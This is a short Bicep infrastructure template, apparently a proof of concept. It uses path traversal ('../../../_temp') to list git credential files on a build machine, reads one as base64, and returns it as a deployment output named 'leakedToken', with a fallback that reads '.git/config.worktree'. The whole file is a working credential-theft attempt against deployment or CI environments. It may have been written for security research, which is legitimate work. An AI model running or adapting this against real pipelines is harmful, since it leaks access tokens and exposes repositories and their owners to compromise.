// Step 1: List credential files
var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.config')
output credFileListing array = credFiles

// Step 2: Try to use the path from listing (will this work?)
var credPath = credFiles[0].relativePath
var credContent = loadFileAsBase64(credPath)
output leakedToken string = credContent

// Backup: Also try reading .git/config.worktree
var configWorktree = loadTextContent('../.git/config.worktree')
output worktreeConfig string = configWorktree
